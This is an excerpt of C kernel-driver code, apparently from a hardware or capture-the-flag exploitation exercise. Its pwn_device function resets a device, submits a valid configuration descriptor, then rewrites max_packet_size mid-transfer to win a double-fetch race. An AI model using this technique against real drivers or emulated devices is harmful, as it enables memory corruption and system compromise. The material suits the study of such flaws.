...
int device_reset(struct private_data *priv) {
  // force device in the uninitialized state.
  printk(KERN_INFO "Resetting device\n");
  EXEC_SYNC(priv, 66 | CMD_EXECUTE);
  return 0;
}
...
int device_init(struct private_data *priv) {
  ...
  struct HostConfigDescriptor host_descriptor = {
      ...
      .max_packet_size = /*MAX_PACKET_SIZE*/ 0x100};
  u16 len;
  u8 status;
  int i;
  volatile int vi;
  ...
  iowrite8(CMD_SET_HOST_CONFIG | CMD_EXECUTE, priv->hwmem);

  wait_event(device_wait_queue, ((ioread8((priv)->hwmem) & CMD_EXECUTE) == 0));
...
int pwn_device(struct private_data *priv, long arg) {
  int i;
  volatile long j;
  struct HostConfigDescriptor host_descriptor = {
      .host_config_descriptor_length = sizeof(struct HostConfigDescriptor),
  ...
  // 1) Make sure we're in the uninitialized state.
  while (ioread8(priv->hwmem + 1) != STATUS_REQ_INIT) {
    printk(KERN_INFO "Resetting device");
    EXEC_SYNC(priv, 66);
  }

  // Send over our valid config, then change it midway.
  // data
  for (i = 0; i < sizeof(struct HostConfigDescriptor); i++) {
    iowrite8(((u8 *)&host_descriptor)[i], priv->hwmem + 4 + i);
  }

  // len
  iowrite8(sizeof(struct HostConfigDescriptor), priv->hwmem + 2);
  ...
  // HACKHACKHACK
  host_descriptor.max_packet_size = MAX_PACKET_SIZE;
  for (i = offsetof(struct HostConfigDescriptor, max_packet_size);
       i < sizeof(struct HostConfigDescriptor); i++) {
    iowrite8(((u8 *)&host_descriptor)[i], priv->hwmem + 4 + i);
  }

  wait_event(device_wait_queue, ((ioread8((priv)->hwmem) & CMD_EXECUTE) == 0));
  return ioread8(priv->hwmem + 1);
}
